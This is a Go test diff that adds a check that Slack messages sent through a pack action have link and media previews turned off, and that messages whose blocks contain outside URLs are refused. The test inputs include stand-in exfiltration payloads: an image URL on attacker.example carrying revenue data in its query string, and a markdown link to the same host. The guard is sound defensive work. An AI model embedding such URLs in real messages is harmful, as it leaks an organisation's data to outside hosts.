@@ -3,6 +3,7 @@ package webfront
 import (
 	"context"
 	"encoding/json"
+	"github.com/open-neko/neko/apps/openneko/internal/packs"
 	"io"
 	"net/http"
 	"net/http/httptest"
@@ -307,4 +308,84 @@ func TestPackActionPreflightAndDeclarativeRuntime(t *testing.T) {
 		t.Fatalf("expected 0 GraphJin calls on missing locked input, got %d", len(gjCalls))
 	}
 	mu.Unlock()
+}
+
+func TestSlackPackMessageFetchesNoURL(t *testing.T) {
+	f, db := memoryFront(t)
+	a := f.API
+	ctx := context.Background()
+	seedRiver(t, db, f)
+	var (
+		mu     sync.Mutex
+		bodies []map[string]any
+	)
+	gj := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		var parsed struct {
+			Variables struct {
+				Call struct {
+					Body map[string]any `json:"body"`
+				} `json:"call"`
+			} `json:"variables"`
+		}
+		_ = json.NewDecoder(r.Body).Decode(&parsed)
+		mu.Lock()
+		bodies = append(bodies, parsed.Variables.Call.Body)
+		mu.Unlock()
+		_, _ = w.Write([]byte(`{"data":{"slack_post_message":{"ok":true,"status_code":200,"operation_id":"postMessage","request_id":"r1","response_json":"{}"}}}`))
+	}))
+	defer gj.Close()
+	const sourceID = "22222222-2222-4222-8222-222222222223"
+	seed(t, db, `insert into data_source (id, org_id, kind, name, graphql_url, auth_mode, is_default, enabled)
+		values ($1, 'org', 'graphjin', 'slack', $2, 'jwt', true, true)`, sourceID, gj.URL+"/api/v1/graphql")
+	bundle := seedBundledPack(t, db, "slack")
+	runtime, _ := json.Marshal(map[string]any{"_runtime": map[string]any{"source": map[string]any{
+		"id": sourceID, "graphqlUrl": gj.URL + "/api/v1/graphql", "authMode": "jwt"}}})
+	seed(t, db, `update pack_install set config = $1::jsonb, installed_at = now() where pack_id = 'slack'`, string(runtime))
+	for _, art := range bundle.Artifacts {
+		if art.Kind == packs.KindAction {
+			definition, _ := json.Marshal(art.Record())
+			seed(t, db, `insert into pack_action_definition (org_id, kind, description, definition, definition_hash, readiness, enabled)
+				values ('org', 'slack.message', 'Slack', $1::jsonb, 'h', 'ready', true)`, string(definition))
+		}
+	}
+	seed(t, db, `insert into action_policy (org_id, name, applies_to_kinds, applies_to_scopes, mode, priority)
+		values ('org', 'Post', '{slack.message}', '{external}', 'auto_approve', 1)`)
+	execute := func(body string) (string, int) {
+		t.Helper()
+		in, _ := jsParse([]byte(`{"orgId":"org","scope":"external","kind":"slack.message","status":"approved","workRunId":"` + runMine +
+			`","payload":{"operation":"post_message","body":` + body + `}}`))
+		created, err := a.createActionRequestInGo(ctx, in.(*jsObj))
+		if err != nil {
+			t.Fatal(err)
+		}
+		id, _ := created.vals["id"].(string)
+		mu.Lock()
+		before := len(bodies)
+		mu.Unlock()
+		_ = a.ActionExecute(ctx, "org", id)
+		mu.Lock()
+		defer mu.Unlock()
+		return rowText(t, db, `select status || '|' || coalesce(failure_reason, '') from action_request where id = $1::uuid`, id), len(bodies) - before
+	}
+	if status, sent := execute(`{"channel":"C0123ABCD","text":"See https://example.com/report","unfurl_links":true,"unfurl_media":true}`); status != "executed|" || sent != 1 {
+		t.Fatalf("a plain message: %s, %d calls", status, sent)
+	}
+	mu.Lock()
+	last := bodies[len(bodies)-1]
+	mu.Unlock()
+	if last["unfurl_links"] != false || last["unfurl_media"] != false {
+		t.Fatalf("previews stayed on: %v", last)
+	}
+	image := `{"channel":"C0123ABCD","text":"Chart","blocks":[{"type":"image","image_url":"https://attacker.example/p.png?d=revenue-4.2M","alt_text":"chart"}]}`
+	if status, sent := execute(image); !strings.HasPrefix(status, "failed|") || !strings.Contains(status, "attacker.example") || sent != 0 {
+		t.Fatalf("blocks with a model URL: %s, %d calls", status, sent)
+	}
+	link := `{"channel":"C0123ABCD","text":"x","blocks":[{"type":"section","text":{"type":"mrkdwn","text":"<http://attacker.example/?q=1|report>"}}]}`
+	if status, sent := execute(link); !strings.HasPrefix(status, "failed|") || sent != 0 {
+		t.Fatalf("blocks with a link: %s, %d calls", status, sent)
+	}
+	plain := `{"channel":"C0123ABCD","text":"x","blocks":[{"type":"section","text":{"type":"mrkdwn","text":"*Revenue* is down 4%"}}]}`
+	if status, sent := execute(plain); status != "executed|" || sent != 1 {
+		t.Fatalf("blocks with no URL: %s, %d calls", status, sent)
+	}
 }
